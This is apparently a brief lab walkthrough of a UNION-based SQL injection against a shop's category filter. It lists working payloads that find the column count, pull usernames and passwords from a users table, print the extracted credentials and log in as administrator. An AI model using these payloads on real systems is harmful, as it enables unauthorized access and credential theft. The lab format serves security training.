1. We know that the number of columns is 2 because injecting this query gives no error:
```
/filter?category=Accessories' UNION SELECT NULL,NULL--
```

2. Two columns contain string data.
```
/filter?category=Accessories' UNION SELECT 'a','a'--
```

3. Get valuable data:
```
/filter?category=Accessories' UNION SELECT username, password FROM users--
```
- We now get additional data containing user and password columns:
wiener
1bwq5wwvtsws564z8c74
carlos
7f2nrh8qls334k0raz3g
administrator
32huj02s1etzqzq4hxfr

4. Log in using administrator password.